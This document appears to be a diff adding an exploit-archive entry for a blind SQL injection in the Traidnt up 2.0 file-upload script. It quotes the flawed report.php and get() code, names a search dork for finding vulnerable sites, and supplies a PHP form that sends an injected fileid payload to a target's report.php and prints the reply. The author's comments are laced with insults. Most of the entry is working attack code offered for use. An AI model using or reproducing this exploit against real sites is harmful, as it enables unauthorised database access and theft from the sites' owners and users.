@@ -1,0 +1,80 @@
+id: 19814
+date: 11/28/2012
+title: Traidnt up 2.0 (report.php trtext) Blind SQL Injection Vulnerability
+author: Cold Zero
+cves: 
+
+<!--
+Exploit : Traidnt up 2.0 (report.php trtext) Blind SQL Injection 
+Author  : Cold z3ro http://www.hackteach.org | http://www.s3curi7y.com
+varibles: fileid,trtext
+usage   : Exploit it manually 
+dork 	: 'powered by traidnt up 2.0'
+
+
+Bug :
+in report.php
+	include("includes/function.php");
+     $trtext = get($_POST[trtext]);
+     $code =  md5(get($_POST[code]));
+     $fileid = get($_POST[fileid]);
+     $cp = $_SESSION['key'];
+
+in includes/function.php checking function get
+ 	function get ($variable){
+
+  		$variable = trim($variable);
+  		$variable = strip_tags($variable); <=  strip_tags not enough to stop hackers [Ya Turky Alwad3any]
+  		//$variable = mysql_real_escape_string($variable); <= mysql_real_escape_string they commant it morons 
+  		return($variable);
+ 	}
+	
+in report.php again
+
+ 	if($errors != ''){
+      $traidnt->assign(message,charset($errors."<b><a href='$site[site_link]/view.php?file=$fileid'>انتظر سوف يتم تحويلك للملف مرة أخري</a></b>"."<META HTTP-EQUIV='Refresh' CONTENT='2; url=$site[site_link]/view.php?file=$fileid'>"));
+      $traidnt->display("message.tpl");
+ 	}else{
+        $ip = getenv('REMOTE_ADDR');
+
+		$reportquery = $db->query("
+INSERT INTO `report` (`report_key` ,`report_why` ,`report_ip` ) VALUES ('$fileid', '$trtext', '$ip');"); 
+
+<= we can inject here trtext and also can inject fileid
+
+        if($reportquery){
+  		$traidnt->assign(message,$lang[report]."<META HTTP-EQUIV='Refresh' CONTENT='2; url=$site[site_link]/view.php?file=$fileid'>");
+-->
+
+----------------------- start of exploit and do it manually -----------------------
+<form method="POST">
+Target <input type="text" name="h" value="<? if($_POST['h']) {echo $_POST['h']; }else{echo 'http://www.google.com/upload/ lol am joking :D';} ?>" size="70" /><br />
+Exploit <input type="text" name="f" value="<? if($_POST['f']) {echo $_POST['f']; }else{echo "yumy'+order+by+4";} ?>" size="70" /><br /> <!--exploit here -->
+<input type="hidden" name="t" value="Exploit+by+Cold+z3ro" /> <!-- and also can exploit here -->
+<input type="hidden" name="c" value="4473e588b35568687564de38ed134d0b" /> <!-- md5(anything you want) no need to change -->
+<input type="submit" name="xdc" />
+</form>
+
+<?
+// manul exploit i have no time to continue coding
+if($_POST["xdc"]){
+if( !eregi('http://', $_POST[h])){
+	die('use "http://" in the link you moron and / at end');
+}else{
+     $t = $_POST[t];
+     $c = $_POST[c];
+     $f = $_POST[f];
+     $h = $_POST[h].'report.php';
+$data = array('trtext' => $t, 'code' => $c, 'fileid' => $f);
+$options = array('http' => array('method'  => 'POST','content' => http_build_query($data)));
+$context = stream_context_create($options);
+$conlink = file_get_contents($h, false, $context);
+//removing the fucking meta, redirects killing me , so decide to replace it 
+$result = str_replace ("HTTP-EQUIV=","z3ro",$conlink); 
+var_dump($result);
+}
+}
+?>
+----------------------- end of exploit -----------------------
+
+#  0day.today [2023-03-24]  #
